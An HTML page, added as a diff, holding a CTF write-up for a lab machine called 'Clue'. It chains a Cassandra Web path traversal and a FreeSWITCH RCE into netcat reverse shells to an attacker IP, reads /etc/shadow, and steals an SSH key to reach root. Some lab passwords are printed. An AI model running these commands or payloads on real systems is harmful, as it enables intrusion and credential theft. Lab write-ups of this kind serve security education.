@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Clue &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Clue</h1>
+    <div class="meta">Target: <code>192.168.176.240</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">CassandraWeb</span><span class="tag">PathTraversal</span><span class="tag">CVE</span><span class="tag">FreeSwitch</span><span class="tag">RCE</span><span class="tag">SSHKeyTheft</span><span class="tag">sudo</span><span class="tag">infodisclosure</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#nmap">Nmap</a><a class="lvl3" href="#cassandra-web-on-port-3000">Cassandra Web on Port 3000</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#path-traversal-extracting-credentials-from-proc-self-cmdline">Path Traversal, Extracting Credentials from /proc/self/cmdline</a><a class="lvl3" href="#freeswitch-event-socket-password">FreeSWITCH Event Socket Password</a><a class="lvl3" href="#freeswitch-authenticated-rce">FreeSWITCH Authenticated RCE</a><a class="lvl3" href="#lateral-move-to-cassie">Lateral Move to cassie</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#cassie-s-sudo-running-a-misconfigured-cassandra-web-server">cassie&#x27;s sudo, Running a Misconfigured Cassandra Web Server</a><a class="lvl3" href="#stealing-anthony-s-ssh-key">Stealing anthony&#x27;s SSH Key</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Clue is a Linux box running four services: Apache (403 everywhere), Cassandra Web on port 3000, and FreeSWITCH on port 8021. Cassandra Web 0.5.0 has a path traversal vulnerability that leaks arbitrary files. That vulnerability surfaces the Cassandra Web credentials from <code>/proc/self/cmdline</code>, and the FreeSWITCH event socket password from its config file. FreeSWITCH has an authenticated RCE exploit, which provides a shell as <code>freeswitch</code>. From there, the path escalates through <code>cassie</code> (whose <code>sudo</code> rights allow running a new Cassandra Web server) to root, by exploiting the same path traversal against a locally hosted instance to read <code>/etc/shadow</code> and grab anthony's SSH private key.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">Nmap</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE          VERSION
+22/tcp   open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2
+80/tcp   open  http             Apache httpd 2.4.38 (Debian)  [403 Forbidden]
+3000/tcp open  http             Thin httpd  [Cassandra Web]
+8021/tcp open  freeswitch-event FreeSWITCH mod_event_socket
+</code></pre>
+<p>Port 80 returns 403 everywhere, including a <code>/backup</code> directory. The real attack surface is ports 3000 and 8021.</p>
+<h3 id="cassandra-web-on-port-3000">Cassandra Web on Port 3000</h3>
+<p>Searching Exploit-DB for <code>Cassandra</code>:</p>
+<pre><code class="language-sh">Cassandra Web 0.5.0 - Remote File Read  |  linux/webapps/49362.py
+</code></pre>
+<p>The exploit traverses with <code>../</code> sequences to read arbitrary files from the host filesystem.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="path-traversal-extracting-credentials-from-proc-self-cmdline">Path Traversal, Extracting Credentials from /proc/self/cmdline</h3>
+<p>The exploit comment shows how to recover credentials:</p>
+<pre><code class="language-python"># &gt; cassmoney.py 10.0.0.5 /proc/self/cmdline
+# /usr/bin/ruby2.7/usr/local/bin/cassandra-web--usernameadmin--passwordP@ssw0rd
+</code></pre>
+<p>Running it against the box:</p>
+<pre><code class="language-sh">python3 49362.py 192.168.176.240 -p 3000 -f /proc/self/cmdline
+
+/usr/bin/ruby2.5/usr/local/bin/cassandra-web-ucassie-pSecondBiteTheApple330
+</code></pre>
+<blockquote>
+<p><strong>Why <code>/proc/self/cmdline</code> leaks the password:</strong> Linux exposes each process's command-line arguments at <code>/proc/&lt;pid&gt;/cmdline</code>. When the Cassandra Web Ruby process started with <code>--password</code> on the command line, that argument, including the plaintext password, became readable by anyone who could read that proc entry. The path traversal made it accessible without any authentication.</p>
+</blockquote>
+<p>Credentials extracted:</p>
+<pre><code>cassie:‹redacted›
+</code></pre>
+<p>These do not work over SSH directly.</p>
+<h3 id="freeswitch-event-socket-password">FreeSWITCH Event Socket Password</h3>
+<p>The FreeSWITCH event socket on port 8021 requires a password. The config file location is non-default on Debian:</p>
+<pre><code class="language-sh">python3 49362.py 192.168.176.240 -p 3000 -f /etc/freeswitch/autoload_configs/event_socket.conf.xml
+
+&lt;configuration name=&quot;event_socket.conf&quot; description=&quot;Socket Client&quot;&gt;
+  &lt;settings&gt;
+    &lt;param name=&quot;listen-ip&quot; value=&quot;0.0.0.0&quot;/&gt;
+    &lt;param name=&quot;listen-port&quot; value=&quot;8021&quot;/&gt;
+    &lt;param name=&quot;password&quot; value=&quot;StrongClueConEight021&quot;/&gt;
+  &lt;/settings&gt;
+&lt;/configuration&gt;
+</code></pre>
+<h3 id="freeswitch-authenticated-rce">FreeSWITCH Authenticated RCE</h3>
+<p>Exploit-DB lists an authenticated command execution exploit for FreeSWITCH 1.10.1 (EDB-47799). It connects to the event socket and runs commands via the <code>api</code> interface:</p>
+<pre><code class="language-sh">python3 47799.py 192.168.176.240 whoami
+Authenticated
+Content-Type: api/response
+Content-Length: 11
+
+freeswitch
+</code></pre>
+<p>A standard reverse shell on common ports fails, but port 3000 is known to be reachable:</p>
+<pre><code class="language-sh">python3 47799.py 192.168.176.240 'nc 192.168.45.244 3000 -e /bin/bash'
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 3000
+connect to [192.168.45.244] from (UNKNOWN) [192.168.176.240] 51824
+
+whoami
+freeswitch
+</code></pre>
+<p>Shell upgraded:</p>
+<pre><code class="language-sh">python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+freeswitch@clue:/$
+</code></pre>
+<h3 id="lateral-move-to-cassie">Lateral Move to cassie</h3>
+<p><code>freeswitch</code> is a service account with no useful privileges. Switch to <code>cassie</code> using the recovered credentials:</p>
+<pre><code class="language-sh">su cassie
+Password: ‹redacted›
+cassie@clue:/$
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="cassie-s-sudo-running-a-misconfigured-cassandra-web-server">cassie's sudo, Running a Misconfigured Cassandra Web Server</h3>
+<pre><code class="language-sh">cassie@clue:/$ sudo -l
+User cassie may run the following commands on clue:
+    (ALL) NOPASSWD: /usr/local/bin/cassandra-web
+</code></pre>
+<p><code>cassie</code> can start Cassandra Web as root, binding to any address. Starting it on port 4444 creates a second instance of the same path-traversal-vulnerable application, but this one runs with root context:</p>
+<pre><code class="language-sh">sudo cassandra-web -B 0.0.0.0:4444 -u cassie -p ‹redacted›
+</code></pre>
+<p>Spawn a second shell using the FreeSWITCH RCE:</p>
+<pre><code class="language-sh">python3 47799.py 192.168.176.240 'nc 192.168.45.244 80 -e /bin/bash'
+</code></pre>
+<p>Switch to cassie in the new shell, then use <code>curl</code> to hit the locally hosted traversal:</p>
+<pre><code class="language-sh">curl --path-as-is 127.0.0.1:4444/../../../../../../../../etc/shadow
+root:$6$kuXiAC8PIOY2uis9$LrTzlkYSlY485ZREBLW5i...:19209:0:99999:7:::
+cassie:$6$/WeFDwP1CNIN34/z$9woKS...:19209:0:99999:7:::
+anthony:$6$01NV0gAhVLOnUHb0$byLv...:19209:0:99999:7:::
+</code></pre>
+<blockquote>
+<p><strong>Why sudo → cassandra-web → traversal escalates to root:</strong> sudo grants the cassandra-web process root privileges. The web server can then read any file on the filesystem, because the path traversal bypasses its own application root and the OS file permissions are evaluated as the running user, which is root. The attacker never needs a root shell directly; they get the same read-anywhere capability through the application.</p>
+</blockquote>
+<h3 id="stealing-anthony-s-ssh-key">Stealing anthony's SSH Key</h3>
+<p>Rather than cracking root's hash, the path traversal can read SSH keys directly:</p>
+<pre><code class="language-sh">curl --path-as-is 127.0.0.1:4444/../../../../../../../../home/anthony/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEA...
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>Transfer the key to the target, set permissions, and SSH to root locally (the key authorizes root login on localhost):</p>
+<pre><code class="language-sh">chmod 600 id_rsa
+ssh root@127.0.0.1 -i id_rsa
+root@clue:~# whoami
+root
+</code></pre>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh">root@clue:~# cat proof_youtriedharder.txt
+‹redacted›
+</code></pre>
+<p>Local flag was also recoverable from <code>/var/lib/freeswitch/local.txt</code> as the freeswitch user.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong><code>/proc/self/cmdline</code> leaks command-line passwords.</strong> Any application that accepts credentials as CLI arguments exposes them to any process with filesystem read access, or to a path traversal in the same application.</li>
+<li><strong>Path traversal + sudo is a root read primitive.</strong> When a traversal-vulnerable app can be started with elevated privileges via sudo, the combination grants root-level file reads without ever escaping to a shell.</li>
+<li><strong>Chaining CVEs through service credentials is a common PG pattern.</strong> Each service leaked the key to the next: traversal gave Cassandra creds, Cassandra proc cmdline gave FreeSWITCH password, FreeSWITCH gave shell, sudo gave traversal-as-root, traversal gave SSH key.</li>
+<li><strong>When hash cracking looks expensive, check for SSH keys first.</strong> Raw /home directories are often more valuable than <code>/etc/shadow</code>.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
